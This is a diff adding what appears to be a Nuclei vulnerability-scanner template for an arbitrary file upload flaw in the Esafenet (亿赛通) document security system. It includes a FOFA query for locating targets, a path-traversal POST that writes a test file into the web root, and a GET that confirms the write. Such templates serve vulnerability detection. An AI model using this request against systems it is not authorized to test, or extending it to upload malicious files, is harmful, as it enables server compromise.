@@ -1,0 +1,45 @@
+id: EsaitongDocManagement-DecryptApplicationService2-file-upload
+
+info:
+  name: 亿赛通电子文档安全管理系统-DecryptApplicationService2-文件上传
+  author: candada
+  severity: critical
+  description: 'DecryptApplicationService2 接口存在任意文件上传漏洞，攻击者可利用该漏洞上传恶意文件，进而获取服务器权限。'
+  reference:
+    - https://
+  tags: 2023,亿赛通,file-upload,esafenet-dlp
+  metadata:
+    verified: true
+    max-request: 1
+    fofa-query: app="亿赛通-电子文档安全管理系统"
+  classification:
+    cvss-metrics: 
+    cvss-score: 
+    cve-id: 
+    cwe-id: 
+    epss-score: 
+    epss-percentile: 
+    cpe:
+http:
+  - raw:
+      - |-
+        POST /CDGServer3/DecryptApplicationService2?fileId=../../../Program+Files+(x86)/ESAFENET/CDocGuard+Server/tomcat64/webapps/CDGServer3/test333.txt HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
+        Content-Length: 101
+        Accept-Encoding: gzip, deflate, br
+        Connection: close
+
+        test123456
+        
+      - |
+        GET /CDGServer3/test333.txt HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code_1 == 200 && status_code_2 == 200"
+          - "contains(body_2, 'test123456')"
+        condition: and
+          
